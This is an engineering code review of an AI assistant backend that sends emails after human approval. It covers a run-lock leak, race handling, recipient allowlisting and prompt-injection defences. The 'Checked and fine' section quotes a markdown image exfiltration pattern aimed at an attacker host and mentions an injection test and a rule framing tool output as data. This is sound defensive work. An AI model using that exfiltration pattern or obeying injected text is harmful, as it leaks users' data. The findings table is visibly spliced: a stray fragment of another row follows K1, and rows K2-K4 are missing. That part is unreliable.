# Code review: workstream K (Assistant)

- **Scope:** `backend/**` (assistant, notifications Outbox backend + migrations, settings block) and
  `frontend/src/features/assistant/{transport,sse,types,toolChips}.ts` plus `frontend/src/api/mutator.ts`
  (`streamFetch`). Panel/Outbox UI components were out of scope except where a backend outcome reaches them
  (markdown renderer, Outbox iframe, tool chips).
- **Commit reviewed:** `01973ba` on `wsK/assistant` (base `origin/main`). Backend is identical to `8ec7cea`
  ("send_email artifacts say what happened"); commits since then touch only frontend UI. The working tree's
  uncommitted `transport.ts` diff is a comment-only change.
- **Ran:**
  - `uv run pytest -q assistant notifications` (env per brief, suffix `wsKreview`): **103 passed, 1 deselected**
    (`test_live`, marked live).
  - `npx vitest run --project unit src/features/assistant/{transport.test.tsx,toolChips.test.ts,sse.test.ts}`:
    **24 passed**.
  - Mutation spot-checks, using a temporary untracked test file that re-ran existing tests with monkeypatched
    code (deleted afterwards; no tracked file touched):
    - **A**, `RecipientAllowlistMiddleware` removed: `test_injection_in_item_copy_changes_nothing` and
      `test_outside_recipient_is_refused_without_asking_for_approval` both **fail**.
    - **B**, send idempotency off (`tool_call_id=""`): `test_disconnect_while_the_approved_send_runs_never_sends_twice`
      **fails** (`2 == 1`).
    - **C**, endpoint recipient check off in `hitl_decision`: `test_edit_to_an_outside_address_is_a_field_error`
      **fails** (`200 == 422`).
    - **D**, my repro for K1: `stream_run(...)` claimed, then closed with `aclosing(aiter(body))` before the
      first read (what Django's `send_response` does if it's cancelled at `await send(http.response.start)`).
      Result: `running_since` is **still set**. A 4-line plain-Python check confirms the mechanism: an async
      generator closed before its first `__anext__` never runs its `finally`.

## Verdict

**Approve after K1-K3 are fixed. No critical findings.** The security core holds up. The allowlist is enforced
in code three times. An edit can't switch tools (HITL pins `name` with a `Literal`, and our schema pins it again).
Resume races are serialized by the conditional-UPDATE lock. CSRF covers both streaming POSTs. The Outbox HTML is
escaped and sandboxed, and markdown can't fetch anything. The real problems are in the run lifecycle:

- K1: a lock can leak for 10 minutes.
- K2: a completed run can be reported as failed.
- K3: after a disconnect mid-send, the re-shown approval card can record an outcome that contradicts the Outbox.

K4 is a spec §6.4 gap (no LLM usage logging). It can land as a follow-up and doesn't block merge.

## Findings

| ID | Sev | Finding (file:line, scenario) | Suggested fix | Resolution |
|---|---|---|---|---|
| K1 | important | **The run lock leaks when the response body never starts.** The lock is taken in the sync view (`api.py:139`, `api.py:180`). It is released only in `stream_run`'s `finally` (`runs.py:217-239`), and the producer task is created *inside* the generator (`runs.py:195`). An async generator that's closed before its first `__anext__` never enters its `try`, so neither runs. Django reaches that state on two paths. (a) `asgi.py:203-209`: the client disconnects while the sync view is still running. That window is ~50-200 ms, because the view does `claim_run` and then opens a psycopg connection and compiles a graph for `_pending`. `listen_for_disconnect` then cancels `run_get_response`, the view's thread finishes anyway, `response` stays `None`, and the response is never iterated or closed. (b) The disconnect lands at `await send(http.response.start)` (`asgi.py:312`); `aclosing(...).aclose()` on an unstarted generator is a no-op. `response.close()` (`asgi.py:218`) doesn't help either: `_resource_closers` only picks up a `.close` attribute (`django/http/response.py:512`), and async generators have only `aclose`. Repro D above. **Scenario:** a user hits Send and immediately switches threads; `setThreadId` → `abortRun()` (`transport.ts:163-166`) aborts the fetch. Every later Send or Approve on that thread is 409 "A reply is already running in this thread." for `STALE_RUN` = 10 min (`selectors.py:14`). | Make the lock a lease. Shrink `STALE_RUN` to ~60 s and renew it from the **producer side**: a sibling heartbeat task created next to the producer in `stream_run`, updating every ~15 s and cancelled with it. Don't renew from the consumer loop. The consumer blocks on `yield` while a slow client applies backpressure; the lease would lapse while the producer still runs, and a second tab's `claim_run` would put two agents on one checkpoint. Path (a) is still covered, because none of these tasks ever start there. Key `release_run` on a claim token, e.g. a `run_token` UUID column instead of `claimed_at`, since renewals change the timestamp. Optionally also wrap the body in an object with a sync `close()` that releases when the generator never started; that covers path (b) at once, but path (a) has no response object to hook, so it needs the lease. Add a test that closes an unstarted body and asserts the thread is claimable within the lease. | |

The authors observed the trigger in an ASGI smoke test, and Approve-then-switch-thread reaches it. | (1) In `RecipientAllowlistMiddleware.awrap_tool_call`, before calling the HITL handler: if an `OutboxEmail` exists for `(thread_id, tool_call_id)`, return the sent `ToolMessage` (content plus `email_sent_artifact` built from the stored row) and don't interrupt. That needs `thread_id` on the middleware (it's already passed to `build_agent`). (2) On the idempotent path, have `send_approved_email` return the stored row (id + `to`) and report *that*, never the args. ## Checked and fine

- **Allowlist parsing:** `parseaddr` with `address != stripped` (`email.py:52-58`) rejects display names, lists and `\r\n` tricks. The exact-domain `rpartition` check rejects `clearpath.demo.evil.com`. Exact set membership after `.lower()` rejects homoglyphs and zero-width characters. Unicode case-folds such as `K` (Kelvin sign) map to the canonical lowercase address, which is what gets sent and stored.
- **Model args vs edited args:** the model's args are checked before the interrupt (outer middleware, side-effect free). Edits are checked at the endpoint (422 on `to`, `item_key`, multi-line subject), and again by the tool and `send_approved_email`. HITL pins the edit's `name` to the gated tool (`human_in_the_loop.py:220-233`), and `EditedActionIn.name` is `Literal["send_email"]`.
- **Resume races / double submit:** the claim is one conditional UPDATE (`services.py:33-36`), `still_pending` runs under the lock (`api.py:175-180`), and a second resume gets a 409. The unique `(thread_id, tool_call_id)` constraint backs idempotency.
- **Ownership:** every route goes through `owned_thread` (404, not 403). Checkpoint reads use the thread id only after that check, and `claim_run` filters on owner.
- **CSRF on streaming POSTs:** `django_auth` enforces it (`ninja/security/apikey.py:50`), and `streamFetch` sends `X-CSRFToken` through `sameOriginFetch`.
- **AI never approves / no item writes:** the tools are read-only selectors plus `send_email` and `build_export` (export roles only). `test_no_tool_offers_a_decision_assignment_or_status_change` and the injection test cover this, and mutant A kills the injection test.
- **Untrusted text stays data:** tool outputs are JSON string fields, the static block's `<authority>` section frames them as data, the open item's title is JSON-quoted, and partner `contact_email` can't be emailed (not allowlisted).
- **Error frames:** `failure_message` gives a fixed line per exception class. `tool-error` text is replaced. ToolNode's default `handle_tool_errors` returns text only for `ToolInvocationError` and re-raises everything else (`langgraph/prebuilt/tool_node.py:391-399`), so DB or exception text never reaches `tool-finished` or `values`. No `message-error` producer exists in the installed langchain/langgraph.
- **Outbox HTML:** the `.html` template autoescapes, and `linebreaksbr` escapes under autoescape. The only URL is `FRONTEND_BASE_URL/items/<pk>`. It's rendered via `srcDoc` in `sandbox=""` (`OutboxPage.tsx` at HEAD), so prod's `X_FRAME_OPTIONS=DENY` doesn't affect it.
- **Markdown:** images render as alt text, and links render as "label (href)" with no anchor (`AssistantMarkdown.tsx:66-75`), which closes the `![](https://evil/?d=…)` exfiltration path. Raw HTML is off.
- **Tool chips:** send outcomes come from the app-set artifact, not the model's text (`toolChips.ts` `emailOutcome` at HEAD). The send-time-blocked case now reads "Blocked", not "Sent".
- **Async ORM:** every ORM touch in async code goes through `sync_to_async`: `build_agent`, each tool, the recipient check, and `release_run`. `has_role` / `effective_roles` read an ArrayField and make no query. The producer task inherits Django's per-request `ThreadSensitiveContext`, so it shares the request's DB thread and connection.
- **Checkpointer connection lifetime:** one `AsyncPostgresSaver.from_conn_string` per run or state read, closed by `async with` even on cancel. It's separate from Django's connection, so it commits on its own.
- **Sync view returning an async iterator:** served natively under ASGI (`asgi.py:320-339`). Under the WSGI test client, Django drains it via `async_to_sync` (the warning in the test output is expected).
- **Keepalive and buffering:** `running` goes out first, so headers and first byte flush immediately, then `: keepalive` follows every 15 s of silence. That stays under CloudFront's default 30 s origin read timeout (no other proxy layer checked). Headers are `no-cache, no-transform` + `X-Accel-Buffering: no`, and there's no GZip middleware.
- **`aprune` safety:** `keep_latest` keeps the latest checkpoint with its writes and referenced blobs, and runs only on `completed`, under the run lock.
- **Middleware interplay:** ContextEditing only rewrites the model request and has no tool hook. `run_model_call_count` is `UntrackedValue`, so it resets on resume. The limit fires in `before_model`, between complete steps, so it never leaves a dangling `tool_use`.
- **Dangling tool calls after a cut-short run** get a stopped `ToolMessage` before the next human message, and paused calls are excluded (`runs.py:83-97`, tested).
- **Protocol fidelity:** v3 `messages` chunks are already protocol content-block events (`message-start` / `content-block-*`), so unwrapping `[chunk, metadata]` matches `MessagesEvent`. `input.requested` is emitted once per interrupt id per run. Lifecycle events are synthesized at the root.
- **Adapter:** `seq` / `event_id` are thread-monotonic across runs, `applied_through_seq` is set before the run's events, and the per-run replay buffer satisfies the late-open contract (`transport.d.ts` "Replay contract"; the controller dedupes by `event_id`). Channel/namespace/depth filtering maps `input.requested` to the `input` channel. Unsupported commands return `not_supported`. A dropped stream synthesizes a terminal `failed`. `getState` normalizes dead-run `next`, and 404 maps to `null`.
- **`sse.ts`:** CRLF split across chunks, comment lines, multi-line `data:`, a final unterminated frame, and cancel on abort.
- **`streamFetch`:** non-2xx bodies are parsed into `ApiError` before the stream, so 409/422 reach the UI as normal errors.
- **Error-handling standard (§6.1):** endpoints have no domain try/except. `_locked`'s `except BaseException: release; raise` is a decision point, and the runner's broad `except` is the stream's process boundary, which logs with `thread_id`.
- **Tests that bite:** mutants A, B and C are each killed by the tests that claim them.
- **Out of K's scope, noted:** `CONN_MAX_AGE=60` under ASGI (`config/settings/base.py:140`). Django recommends persistent connections off under ASGI, and each request's thread-sensitive thread holds its own connection. That's foundation's call.
